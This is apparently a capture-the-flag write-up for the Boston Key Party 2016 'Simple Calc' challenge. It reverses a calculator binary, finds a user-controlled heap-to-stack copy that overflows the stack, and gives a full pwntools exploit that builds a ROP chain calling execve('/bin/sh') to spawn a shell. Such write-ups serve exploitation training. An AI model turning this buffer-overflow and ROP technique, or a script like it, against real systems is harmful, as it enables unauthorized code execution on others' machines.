---
title: Boston Key Part 2016 Simple Calc
author: megachar0x01
date: 2022-06-28
categories: [Pwn, amd64, Binary Exploitation, nightmare, module07]

---


Let's start reversing it with the main function first we see that a value is taken which is stored in the no_loops variable ( Int )  then it is used to create a loop, used as a size for allocating memory on the heap, and also use to control how much memory is to be copied from  heap to stack  then input is taken from user to select what type of function is to be executed (1. addition, 2. subtraction, 3. multiplication, 4. division and 5. copy memory from heap to stack ) after the loop is completely free is used to free up heap memory and program exits

<img src="https://i.imgur.com/MIHUwNT.png" alt="image_1">



##### Add function

In Add function, we can see that it takes 2 input and then store it in a global variable and then check if it is greater than 39 then it will add two values and store them in a third global variable, and then the exit function and if it is smaller than 39 than prints a msg and exit without doing anything

<img src="https://i.imgur.com/bd704CK.png" alt="image_2">


Rest of the function doing as the name suggests sub,mul, and divide but with the same restrictions as add function (check the value if its greater than 39)

Now we have a general view of the program let's start working on getting shell

The first vuln I can find is that the stack has limited space ( 40 bytes ) and the number of bytes to be copied is controlled by the user


**no_loops is controlled by user**

<img src="https://i.imgur.com/NmOuNTd.png" alt="img_3">




Now its time to fill the heap with values like its stack (because it will be placed on the stack ) for that we see that after the calculation function ( add, sub, mul, div) we can see that the global value is placed on the heap every time on a different address (because of for_loop multiplying by the address which is incrementing the address value )

Now its time to start working on the exploit first we start by padding . One important thing we will do is overwrite the heap pointer which will be used by the free function to free memory to bypass we will add that variable with "zero" so the free function closes without error and rest of padding till we control instruction pointer rest of is simple creating rope chain.


Now for rop chain our goal is to get shell so we can use sys_execv syscall (man execv ) to call "/bin/sh" for that we have to put the string "/bin/sh" in memory then put the memory pointer to rsi register we can put "0x0" in rest of register (rdi,rdx) and then put "0x3b" (which is number of sys_execv)   in rax and call syscall rop gadget and  u got a shell on the system (THis was the second-best challenge after sandbox escape )

```python
#!/usr/bin/python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
break *main+518
continue
'''.format(**locals())

# break *0x0000000000401545



exe = "./simplecalc" ; elf = context.binary=ELF(exe,checksec=False)

rop= ROP(exe,checksec=False)

def menu(menu_no,menu_x,menu_y):
    io.sendlineafter(b"=>",menu_no)
    io.sendlineafter(b"Integer x: ",menu_x)
    io.sendlineafter(b"Integer y: ",menu_y)
    io.recvline()

def zero ():
    menu(b"2",b"2000",b"2000")

def format_f(fromat_value):
    x = int(fromat_value) - 50000
    menu(b"1",str(x),b"50000")
    zero()

def padd ():
    for x in range(18):
        zero()

#### ROP #############
mov_ptr_rax_rdx_ret = 0x000000000044526e # mov qword ptr [rax], rdx; ret; 
pop_rdi = 0x0000000000401b73
pop_rdx = 0x0000000000437a85
pop_rax = 0x000000000044db34
pop_rsi = 0x0000000000401c87
syscall = 0x00000000004648e5
bin_var = 0x6e69622f
sh_var = 0x68732f


######################


io = start ()

io.sendlineafter(b"Expected number of calculations: ",b"150")

padd ()
format_f(pop_rdx)
format_f(bin_var)
format_f(pop_rax)
format_f(0x6c0008)
format_f(mov_ptr_rax_rdx_ret)
format_f(pop_rax)
format_f(0x6c000c)
format_f(pop_rdx)
format_f(sh_var)
format_f(mov_ptr_rax_rdx_ret)
format_f(pop_rdi)
format_f(0x6c0008)
format_f(pop_rsi)
format_f(0x0)
format_f(pop_rdx)
format_f(0x0)
format_f(pop_rax)
format_f(0x3b)
format_f(syscall)


io.sendlineafter(b"=>",b"5")
io.interactive()
```

[![asciicast](https://asciinema.org/a/504622.svg)](https://asciinema.org/a/504622)
